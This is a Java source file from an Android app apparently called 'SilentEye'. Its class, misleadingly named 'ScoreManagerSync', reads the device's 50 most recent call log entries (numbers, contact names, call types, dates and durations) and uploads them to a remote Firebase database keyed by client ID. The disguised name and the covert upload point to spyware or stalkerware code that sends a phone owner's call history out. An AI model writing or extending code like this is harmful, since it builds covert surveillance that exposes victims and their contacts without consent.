package com.silenteye;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ScoreManagerSync {
    private static final String TAG = "ScoreManagerSync";

    public static void readAndSendCallLogs(Context context) {
        List<Map<String, Object>> callLogs = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();

        String[] projection = new String[]{
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };

        String sortOrder = CallLog.Calls.DATE + " DESC";

        // Get the last 50 call logs
        try (Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, projection, null, null, sortOrder)) {
            if (cursor != null) {
                int numberIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER);
                int nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME);
                int typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE);
                int dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION);

                int count = 0;
                while (cursor.moveToNext() && count < 50) {
                    Map<String, Object> callLogMap = new HashMap<>();
                    String number = cursor.getString(numberIdx);
                    String name = cursor.getString(nameIdx);
                    int callType = cursor.getInt(typeIdx);
                    long date = cursor.getLong(dateIdx);
                    long duration = cursor.getLong(durationIdx); // duration in seconds

                    String callTypeStr = "UNKNOWN";
                    switch (callType) {
                        case CallLog.Calls.INCOMING_TYPE:
                            callTypeStr = "INCOMING";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            callTypeStr = "OUTGOING";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            callTypeStr = "MISSED";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            callTypeStr = "REJECTED";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            callTypeStr = "BLOCKED";
                            break;
                    }

                    callLogMap.put("number", number != null ? number : "Unknown Number");
                    callLogMap.put("name", name != null ? name : "Unknown Name");
                    callLogMap.put("callType", callTypeStr);
                    callLogMap.put("date", date);
                    callLogMap.put("duration", duration);

                    callLogs.add(callLogMap);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading Call Logs", e);
        }

        // Send to Firebase under clients/{CLIENT_ID}/call_logs
        DatabaseReference dbRef = ClientManager.getChildRef("call_logs");
        for (Map<String, Object> logEntry : callLogs) {
            dbRef.push().setValue(logEntry);
        }
    }
}
